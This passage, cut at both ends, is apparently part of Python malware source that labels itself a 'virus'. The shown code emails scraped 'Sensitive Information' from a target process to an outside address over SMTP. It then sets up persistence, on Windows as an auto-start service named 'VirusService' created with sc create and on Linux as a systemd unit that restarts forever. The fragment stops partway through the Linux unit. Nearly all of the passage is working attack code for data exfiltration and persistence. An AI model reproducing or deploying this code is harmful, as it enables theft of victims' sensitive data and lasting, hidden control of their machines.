        msg['To'] = target_email
        msg['Subject'] = f"Sensitive Information from {target_process}"

        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(email_user, email_pass)
            server.sendmail(email_user, target_email, msg.as_string())

    send_email(smtp_server, smtp_port, email_user, email_pass, target_email, scraped_data)

    # Step 3: Establish persistence
    def create_persistence():
        if os.name == 'nt':  # Windows
            service_name = 'VirusService'
            service_description = 'A persistent service for the virus'
            service_bin_path = sys.executable  # Path to the current script
            command = f'sc create {service_name} binPath= "{service_bin_path}" start= auto'
            os.system(command)
        else:  # Linux
            service_name = 'virus'
            service_file = f'/etc/systemd/system/{service_name}.service'
            service_content = f"""
            [Unit]
            Description=Persistent Virus Service
            After=network.target

            [Service]
            ExecStart={sys.executable}
            Restart=always

            [Install]
            WantedBy=multi-user.target
